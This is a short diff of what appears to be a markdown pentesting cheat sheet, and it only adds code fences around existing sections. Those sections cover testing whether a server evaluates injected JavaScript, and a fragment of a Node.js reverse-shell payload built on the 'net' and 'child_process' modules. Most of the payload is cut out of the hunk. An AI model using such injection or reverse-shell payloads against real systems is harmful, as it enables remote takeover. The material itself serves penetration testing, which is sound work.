@@ -305,15 +305,15 @@ Change logic to be true to bypass authentication
 Check if simple strings get evaluated by a function
 2+2
 Does it print 2+2 or does it say 4?
-
+```
 More complicated
------------------
+```bash
 (function(){
    return 2+2;
 })();
-
+```
 Reverse Shell
-----------------
+```bash
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -326,7 +326,6 @@ Reverse Shell
     });
     return /a/;
 })();
-
 ```
 
 ##### Other PHP Wrappers
